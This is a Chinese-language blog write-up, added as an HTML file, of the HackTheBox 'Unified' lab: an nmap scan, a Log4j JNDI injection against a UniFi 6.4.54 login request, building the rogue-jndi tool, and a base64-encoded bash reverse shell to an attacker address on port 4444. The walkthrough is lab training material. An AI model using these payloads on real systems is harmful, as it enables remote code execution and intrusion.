@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8" />
+    <meta name="viewport" content="initial-scale=1.0, width=device-width" />
+    <title>
+      
+        HTB-Unified | FlowsecNagi's Home
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/apple-touch-icon.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/favicon-32x32.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/favicon-16x16.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/logo.svg"
+            color=""/>
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/layout.css"/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css"/>
+  
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href="/" class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/logo.svg" />
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E7%A2%8E%E7%A2%8E%E5%BF%B5">反抗者</a>
+            
+              <a class="nav-menu-item" href="/%E5%AD%A6%E4%B9%A0">逃亡之路</a>
+            
+              <a class="nav-menu-item" href="/%E5%8E%AE%E6%9D%80%E6%88%98%E5%9C%BA">战场</a>
+            
+              <a class="nav-menu-item" href="/%E7%A7%91%E7%A0%94">研究所</a>
+            
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner">
+      <div class="post-content__head">
+        <div class="post-title">HTB-Unified</div>
+        <div class="post-info">
+          
+  
+    <a href="/tags/%E7%AC%94%E8%AE%B0/" class="post-tag">#笔记</a>
+  
+    <a href="/tags/HTB/" class="post-tag">#HTB</a>
+  
+    <a href="/tags/STARTING-POINT/" class="post-tag">#STARTING POINT</a>
+  
+
+
+          <span class="post-date">2023-08-02</span>
+        </div>
+      </div>
+      <div id="postBody" class="post-content__body">
+        <div id="tocAnchor" class="toc-anchor">
+          <ol id="toc" class="post-toc">
+            
+          </ol>
+        </div>
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <h1 id="Unified"><a href="#Unified" class="headerlink" title="Unified"></a>Unified</h1><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>开局找教程：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40927195/article/details/128811787">https://blog.csdn.net/qq_40927195&#x2F;article&#x2F;details&#x2F;128811787</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45862635/article/details/125350250">HackTheBox - Unified_unificms6.4.54_Briyney的博客-CSDN博客</a></p>
+<p>开局就是一个扫描的动作：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># nmap -sC -sV 10.129.181.184</span><br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-25 02:31 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.129.181.184<br>Host is up (0.36s latency).<br>Not shown: 972 closed tcp ports (reset)<br>PORT      STATE    SERVICE         VERSION<br>17/tcp    filtered qotd<br>22/tcp    open     ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)<br>465/tcp   filtered smtps<br>714/tcp   filtered iris-xpcs<br>765/tcp   filtered webster<br>1055/tcp  filtered ansyslmd<br>1110/tcp  filtered nfsd-status<br>1198/tcp  filtered cajo-discovery<br>3001/tcp  filtered nessus<br>3351/tcp  filtered btrieve<br>3737/tcp  filtered xpanel<br>3914/tcp  filtered listcrt-port-2<br>4111/tcp  filtered xgrid<br>5431/tcp  filtered park-agent<br>5510/tcp  filtered secureidprop<br>5906/tcp  filtered rpas-c2<br>6789/tcp  open     ibm-db2-admin?<br>8011/tcp  filtered unknown<br>8080/tcp  open     http-proxy<br>| fingerprint-strings: <br>|   FourOhFourRequest: <br>|     HTTP/1.1 404 <br>|     Content-Type: text/html;charset=utf-8<br>|     Content-Language: en<br>|     Content-Length: 431<br>|     Date: Tue, 25 Jul 2023 06:35:50 GMT<br>|     Connection: close<br>|     &lt;!doctype html&gt;&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;&lt;<span class="hljs-built_in">head</span>&gt;&lt;title&gt;HTTP Status 404 <br>|     Found&lt;/title&gt;&lt;style <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;body &#123;font-family:Tahoma,Arial,sans-serif;&#125; h1, h2, h3, b &#123;color:white;background-color:<span class="hljs-comment">#525D76;&#125; h1 &#123;font-size:22px;&#125; h2 &#123;font-size:16px;&#125; h3 &#123;font-size:14px;&#125; p &#123;font-size:12px;&#125; a &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 404 </span><br>|     Found&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;<br>|   GetRequest, HTTPOptions: <br>|     HTTP/1.1 302 <br>|     Location: http://localhost:8080/manage<br>|     Content-Length: 0<br>|     Date: Tue, 25 Jul 2023 06:35:49 GMT<br>|     Connection: close<br>|   RTSPRequest: <br>|     HTTP/1.1 400 <br>|     Content-Type: text/html;charset=utf-8<br>|     Content-Language: en<br>|     Content-Length: 435<br>|     Date: Tue, 25 Jul 2023 06:35:50 GMT<br>|     Connection: close<br>|     &lt;!doctype html&gt;&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;&lt;<span class="hljs-built_in">head</span>&gt;&lt;title&gt;HTTP Status 400 <br>|     Request&lt;/title&gt;&lt;style <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;body &#123;font-family:Tahoma,Arial,sans-serif;&#125; h1, h2, h3, b &#123;color:white;background-color:<span class="hljs-comment">#525D76;&#125; h1 &#123;font-size:22px;&#125; h2 &#123;font-size:16px;&#125; h3 &#123;font-size:14px;&#125; p &#123;font-size:12px;&#125; a &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 </span><br>|     Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;<br>|   Socks5: <br>|     HTTP/1.1 400 <br>|     Content-Type: text/html;charset=utf-8<br>|     Content-Language: en<br>|     Content-Length: 435<br>|     Date: Tue, 25 Jul 2023 06:35:52 GMT<br>|     Connection: close<br>|     &lt;!doctype html&gt;&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;&lt;<span class="hljs-built_in">head</span>&gt;&lt;title&gt;HTTP Status 400 <br>|     Request&lt;/title&gt;&lt;style <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;body &#123;font-family:Tahoma,Arial,sans-serif;&#125; h1, h2, h3, b &#123;color:white;background-color:<span class="hljs-comment">#525D76;&#125; h1 &#123;font-size:22px;&#125; h2 &#123;font-size:16px;&#125; h3 &#123;font-size:14px;&#125; p &#123;font-size:12px;&#125; a &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 </span><br>|_    Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;<br>8192/tcp  filtered sophos<br>8443/tcp  open     ssl/nagios-nsca Nagios NSCA<br>| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US<br>| Subject Alternative Name: DNS:UniFi<br>| Not valid before: 2021-12-30T21:37:24<br>|_Not valid after:  2024-04-03T21:37:24<br>8649/tcp  filtered unknown<br>9091/tcp  filtered xmltec-xmlmail<br>9102/tcp  filtered jetdirect<br>10025/tcp filtered unknown<br>10215/tcp filtered unknown<br>32777/tcp filtered sometimes-rpc17<br>38292/tcp filtered landesk-cba<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port8080-TCP:V=7.93%I=7%D=7/25%Time=64BF6D46%P=x86_64-pc-linux-gnu%r(Ge<br>SF:tRequest,84,<span class="hljs-string">&quot;HTTP/1\.1\x20302\x20\r\nLocation:\x20http://localhost:8080</span><br><span class="hljs-string">SF:/manage\r\nContent-Length:\x200\r\nDate:\x20Tue,\x2025\x20Jul\x202023\x</span><br><span class="hljs-string">SF:2006:35:49\x20GMT\r\nConnection:\x20close\r\n\r\n&quot;</span>)%r(HTTPOptions,84,<span class="hljs-string">&quot;H</span><br><span class="hljs-string">SF:TTP/1\.1\x20302\x20\r\nLocation:\x20http://localhost:8080/manage\r\nCon</span><br><span class="hljs-string">SF:tent-Length:\x200\r\nDate:\x20Tue,\x2025\x20Jul\x202023\x2006:35:49\x20</span><br><span class="hljs-string">SF:GMT\r\nConnection:\x20close\r\n\r\n&quot;</span>)%r(RTSPRequest,24E,<span class="hljs-string">&quot;HTTP/1\.1\x204</span><br><span class="hljs-string">SF:00\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:</span><br><span class="hljs-string">SF:\x20en\r\nContent-Length:\x20435\r\nDate:\x20Tue,\x2025\x20Jul\x202023\</span><br><span class="hljs-string">SF:x2006:35:50\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;&lt;ht</span><br><span class="hljs-string">SF:ml\x20lang=\&quot;en\&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x2</span><br><span class="hljs-string">SF:0Bad\x20Request&lt;/title&gt;&lt;style\x20type=\&quot;text/css\&quot;&gt;body\x20&#123;font-family</span><br><span class="hljs-string">SF::Tahoma,Arial,sans-serif;&#125;\x20h1,\x20h2,\x20h3,\x20b\x20&#123;color:white;ba</span><br><span class="hljs-string">SF:ckground-color:#525D76;&#125;\x20h1\x20&#123;font-size:22px;&#125;\x20h2\x20&#123;font-size</span><br><span class="hljs-string">SF::16px;&#125;\x20h3\x20&#123;font-size:14px;&#125;\x20p\x20&#123;font-size:12px;&#125;\x20a\x20&#123;c</span><br><span class="hljs-string">SF:olor:black;&#125;\x20\.line\x20&#123;height:1px;background-color:#525D76;border:n</span><br><span class="hljs-string">SF:one;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20</span><br><span class="hljs-string">SF:Bad\x20Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>)%r(FourOhFourRequest,24A,<span class="hljs-string">&quot;HTTP/1\.1\</span><br><span class="hljs-string">SF:x20404\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Langu</span><br><span class="hljs-string">SF:age:\x20en\r\nContent-Length:\x20431\r\nDate:\x20Tue,\x2025\x20Jul\x202</span><br><span class="hljs-string">SF:023\x2006:35:50\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html</span><br><span class="hljs-string">SF:&gt;&lt;html\x20lang=\&quot;en\&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Status\x20404\x20\xe2\x80\x9</span><br><span class="hljs-string">SF:3\x20Not\x20Found&lt;/title&gt;&lt;style\x20type=\&quot;text/css\&quot;&gt;body\x20&#123;font-fami</span><br><span class="hljs-string">SF:ly:Tahoma,Arial,sans-serif;&#125;\x20h1,\x20h2,\x20h3,\x20b\x20&#123;color:white;</span><br><span class="hljs-string">SF:background-color:#525D76;&#125;\x20h1\x20&#123;font-size:22px;&#125;\x20h2\x20&#123;font-si</span><br><span class="hljs-string">SF:ze:16px;&#125;\x20h3\x20&#123;font-size:14px;&#125;\x20p\x20&#123;font-size:12px;&#125;\x20a\x20</span><br><span class="hljs-string">SF:&#123;color:black;&#125;\x20\.line\x20&#123;height:1px;background-color:#525D76;border</span><br><span class="hljs-string">SF::none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Status\x20404\x20\xe2\x80\x93\x</span><br><span class="hljs-string">SF:20Not\x20Found&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>)%r(Socks5,24E,<span class="hljs-string">&quot;HTTP/1\.1\x20400\x20\</span><br><span class="hljs-string">SF:r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\</span><br><span class="hljs-string">SF:r\nContent-Length:\x20435\r\nDate:\x20Tue,\x2025\x20Jul\x202023\x2006:3</span><br><span class="hljs-string">SF:5:52\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;&lt;html\x20l</span><br><span class="hljs-string">SF:ang=\&quot;en\&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x2</span><br><span class="hljs-string">SF:0Request&lt;/title&gt;&lt;style\x20type=\&quot;text/css\&quot;&gt;body\x20&#123;font-family:Tahoma</span><br><span class="hljs-string">SF:,Arial,sans-serif;&#125;\x20h1,\x20h2,\x20h3,\x20b\x20&#123;color:white;backgroun</span><br><span class="hljs-string">SF:d-color:#525D76;&#125;\x20h1\x20&#123;font-size:22px;&#125;\x20h2\x20&#123;font-size:16px;&#125;</span><br><span class="hljs-string">SF:\x20h3\x20&#123;font-size:14px;&#125;\x20p\x20&#123;font-size:12px;&#125;\x20a\x20&#123;color:bl</span><br><span class="hljs-string">SF:ack;&#125;\x20\.line\x20&#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/</span><br><span class="hljs-string">SF:style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20</span><br><span class="hljs-string">SF:Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>);<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 411.50 seconds<br></code></pre></td></tr></table></figure>
+
+<p>开放端口有：22、6789、8080、8443</p>
+<blockquote>
+<p>扫描显示端口8080打开，正在运行HTTP代理。代理似乎将请求重定向到端口8443，该端口似乎正在运行SSL web服务器。我们注意到端口8443上页面的HTTP标题是“UniFi网络”。</p>
+</blockquote>
+<p>访问8080端口，重定向到这里：<a target="_blank" rel="noopener" href="https://10.129.181.184:8443/manage/account/login?redirect=/manage">https://10.129.181.184:8443/manage/account/login?redirect=%2Fmanage</a></p>
+<p>不贴图了，上传太麻烦了，大概就是一个登录界面，显示<code>UniFi 6.4.54</code> 的CMS（内容管理系统）</p>
+<p>网上查找版本漏洞：CVE-2021-44228（Apache Log4j远程代码执行漏洞）<a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228">NVD - CVE-2021-44228 (nist.gov)</a></p>
+<p>关于log4j的更多资料：<a target="_blank" rel="noopener" href="https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation">What’s Going on With Log4j? (hackthebox.com)</a></p>
+<p>先抓个包，接下来就是验证这个网站是否真的存在这个漏洞：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#登录验证的原始包</span><br>POST /api/login HTTP/1.1<br>Host: 10.129.183.167:8443<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0<br>Accept: */*<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: https://10.129.183.167:8443/manage/account/login?redirect=%2Fmanage<br>Content-Type: application/json; charset=utf-8<br>Origin: https://10.129.183.167:8443<br>Content-Length: 74<br>Sec-Fetch-Dest: empty<br>Sec-Fetch-Mode: cors<br>Sec-Fetch-Site: same-origin<br>Te: trailers<br>Connection: close<br><br>&#123;<br>	<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<br>	<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin1234&quot;</span>,<br>	<span class="hljs-string">&quot;remember&quot;</span>:<span class="hljs-literal">false</span>,<br>	<span class="hljs-string">&quot;strict&quot;</span>:<span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../image/Unified0.png" alt="Untitled"></p>
+<p>payload：<code>$&#123;jndi:ldap://&#123;TunX IP Address&#125;/whatever&#125;</code></p>
+<p>探测注入点是否存在，If the request causes the server to connect back to us, then we have verified that the application is vulnerable.(假如请求引起的服务器回连我们，我们就已经验证了应用程序存在漏洞。)</p>
+<p><img src="/../image/Unified1.png" alt="Untitled"></p>
+<blockquote>
+<p><strong>JNDI</strong>是Java命名和目录接口API的首字母缩写。通过调用此API，应用程序可以定位资源和其他程序对象。资源是一个程序对象，它提供与系统（如数据库服务器和消息传递系统）的连接。</p>
+</blockquote>
+<blockquote>
+<p><strong>LDAP</strong>是轻量级目录访问协议的缩写，它是一种开放的、与供应商无关的、行业标准的应用程序协议，用于通过Internet或网络访问和维护分布式目录信息服务。LDAP运行的默认端口是端口389。</p>
+</blockquote>
+<aside>
+🔒 tcpdump：是Wireshark的程序或软件，但它是命令行版本。
+
+
+<p>-i： 选择接口。（例如eth0、wlan、tun0）</p>
+<p>port 389：选择我们正在侦听的端口。</p>
+</aside>
+
+<p>ifconfig确认ip后开始监听tun0：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─<span class="hljs-comment">#  tcpdump -i tun0 port 389</span><br>tcpdump: verbose output suppressed, use -v[v]... <span class="hljs-keyword">for</span> full protocol decode<br>listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes<br>08:06:56.744094 IP 10.129.202.83.38274 &gt; 10.10.14.84.ldap: Flags [S], <span class="hljs-built_in">seq</span> 4090119358, win 64240, options [mss 1340,sackOK,TS val 4125686722 ecr 0,nop,wscale 7], length 0<br>08:06:56.744126 IP 10.10.14.84.ldap &gt; 10.129.202.83.38274: Flags [R.], <span class="hljs-built_in">seq</span> 0, ack 4090119359, win 0, length 0<br></code></pre></td></tr></table></figure>
+
+<p>tcpdump输出显示了我们机器上正在接收的连接。这证明该应用程序确实存在漏洞，因为它正试图在LDAP端口389上连接回我们。</p>
+<p>安装Open-JDK and Maven为了构建payload并且发送，以及能在被攻击的系统运行：</p>
+<p>Open JDK是Java开发工具包，用于构建Java应用程序。另一方面，Maven是一个集成开发环境（IDE），可用于创建结构化项目并将我们的项目编译为jar文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># mvn -v</span><br>Apache Maven 3.8.7<br>Maven home: /usr/share/maven<br>Java version: 17.0.6, vendor: Debian, runtime: /usr/lib/jvm/java-17-openjdk-amd64<br>Default locale: en_US, platform encoding: UTF-8<br>OS name: <span class="hljs-string">&quot;linux&quot;</span>, version: <span class="hljs-string">&quot;6.1.0-kali9-amd64&quot;</span>, <span class="hljs-built_in">arch</span>: <span class="hljs-string">&quot;amd64&quot;</span>, family: <span class="hljs-string">&quot;unix&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>安装rogue-jndi工具并编译：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/veracode-research/rogue-jndi<br><span class="hljs-built_in">cd</span> rogue-jndi<br>mvn package<br></code></pre></td></tr></table></figure>
+
+<p>编译成功后显示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[INFO] Replacing /home/kali/Desktop/rogue-jndi/target/RogueJndi-1.1.jar with /home/kali/Desktop/rogue-jndi/target/RogueJndi-1.1-shaded.jar<br>[INFO] Dependency-reduced POM written at: /home/kali/Desktop/rogue-jndi/dependency-reduced-pom.xml<br>[INFO] ------------------------------------------------------------------------<br>[INFO] BUILD SUCCESS<br>[INFO] ------------------------------------------------------------------------<br>[INFO] Total time:  07:29 min<br>[INFO] Finished at: 2023-07-31T07:54:52-04:00<br>[INFO] ------------------------------------------------------------------------                                                                                         <br></code></pre></td></tr></table></figure>
+
+<p>查看编译后可运行的程序：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali/Desktop/rogue-jndi]<br>└─<span class="hljs-comment"># ls -al target</span><br>total 11692<br>drwxr-xr-x 6 root root     4096 Jul 31 07:54 .<br>drwxr-xr-x 5 root root     4096 Jul 31 07:54 ..<br>drwxr-xr-x 4 root root     4096 Jul 31 07:51 classes<br>drwxr-xr-x 3 root root     4096 Jul 31 07:51 generated-sources<br>drwxr-xr-x 2 root root     4096 Jul 31 07:52 maven-archiver<br>drwxr-xr-x 3 root root     4096 Jul 31 07:51 maven-status<br>-rw-r--r-- 1 root root    22240 Jul 31 07:52 original-RogueJndi-1.1.jar<br>-rw-r--r-- 1 root root 11920109 Jul 31 07:54 RogueJndi-1.1.jar<br></code></pre></td></tr></table></figure>
+
+<p>查看肉鸽帮助命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali/Desktop/rogue-jndi]<br>└─<span class="hljs-comment"># cd target    </span><br>                                                                                              <br>┌──(root㉿kali)-[/home/kali/Desktop/rogue-jndi/target]<br>└─<span class="hljs-comment"># java -jar RogueJndi-1.1.jar --help</span><br>+-+-+-+-+-+-+-+-+-+<br>|R|o|g|u|e|J|n|d|i|<br>+-+-+-+-+-+-+-+-+-+<br>Usage: java -jar target/RogueJndi-1.0.jar [options]<br>  Options:<br>    -c, --<span class="hljs-built_in">command</span>  Command to execute on the target server (default: <br>                   /Applications/Calculator.app/Contents/MacOS/Calculator) <br>    -n, --hostname Local HTTP server hostname (required <span class="hljs-keyword">for</span> remote <br>                   classloading and websphere payloads) (default: 127.0.1.1)<br>    -l, --ldapPort Ldap <span class="hljs-built_in">bind</span> port (default: 1389)<br>    -p, --httpPort Http <span class="hljs-built_in">bind</span> port (default: 8000)<br>    --wsdl         [websphere1 payload option] WSDL file with XXE payload <br>                   (default: /list.wsdl)<br>    --localjar     [websphere2 payload option] Local jar file to load (this <br>                   file should be located on the remote server) (default: <br>                   ../../../../../tmp/jar_cache7808167489549525095.tmp) <br>    -h, --<span class="hljs-built_in">help</span>     Show this <span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>可以看到它的<code>--command</code>后面就跟想要执行的系统命令，我们就可以写一个反弹shell了<br>同时为了数据再传输过程中不丢失，我们对反弹shell命令进行base64编码<br><code>echo &quot;/bin/bash -c &#39;/bin/bash -i &gt;&amp;/dev/tcp/10.10.14.179/4444 0&gt;&amp;1&#39;&quot; | base64</code><br>这样就得到了base64加密后的shell</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Desktop]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash -c &#x27;/bin/bash -i &gt;&amp;/dev/tcp/10.10.14.84/4444 0&gt;&amp;1&#x27;&quot;</span> | <span class="hljs-built_in">base64</span>          <br><br>L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYvZGV2L3RjcC8xMC4xMC4xNC44NC80NDQ0IDA+<br>JjEnCg==<br></code></pre></td></tr></table></figure>
+
+<p>使用肉鸽监听4444端口：</p>
